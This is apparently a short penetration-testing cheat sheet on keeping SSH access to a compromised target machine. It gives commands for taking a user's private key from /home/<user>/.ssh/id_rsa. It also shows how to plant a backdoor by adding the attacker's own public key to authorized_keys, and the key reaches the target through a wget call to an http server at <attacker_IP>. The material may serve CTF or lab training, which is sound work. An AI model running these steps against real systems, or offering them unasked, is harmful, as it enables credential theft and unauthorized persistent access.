SSH with id_rsa file
---

with remote access/shell on target machine, check in `/home/<username>/.ssh/id_rsa` for the rsa file. <br>
if there, get it on attack machine and change permissions to read/write for user `chmod 600 id_rsa` <br><br>
      *NOTE: without correct permissions on that file ssh won't allow login (chmod 600 or 400)* <br><br>
after that, you should be able to ssh into target with: <br>
```
$ ssh <user>@<target_IP> -i id_rsa -p <port> *if non standard ssh port is used*
```

if the target doesn't have a generated id_rsa file you can generate your own and put the public key into the `authorized_keys` file on the target machine.<br>

to generate your own: <br>
```
$ ssh-keygen
# generates id_rsa and id_rsa.pub files in .ssh folder on local machine // follow prompts to pw protect file
```
Next, copy the content of the id_rsa.pub file and put it inside the authorized_keys file on the target machine (located in /.ssh folder). <br>

*NOTE: if there isn't an authorized_keys file in /.ssh you'll need to make one*
```
(on target machine)
/.ssh$ touch authorized_keys
# creates the file

/.ssh$ chmod 600 authorized_keys
# changes permissions for the user to read/write to file

NOTE: to get your file to target system set up python server on attack machine and use wget from target machine

(on attack machine)
$ python3 -m http.server <port>
# sets up server on your machine for target machine to grab files

(on target machine)
/.ssh$ wget http://<attacker_IP>:<port>/path/to/public/key
# grabs id_rsa_pub file

/.ssh$ cat id_rsa_pub
# displays the contents to be copied (can remove file afterwards)
 
/.ssh$ nano authorized_keys
# opens the file with nano to be edited // paste contents from the pub file here
```

After that you can ssh into target machine with your id_rsa file from attack machine.<br>
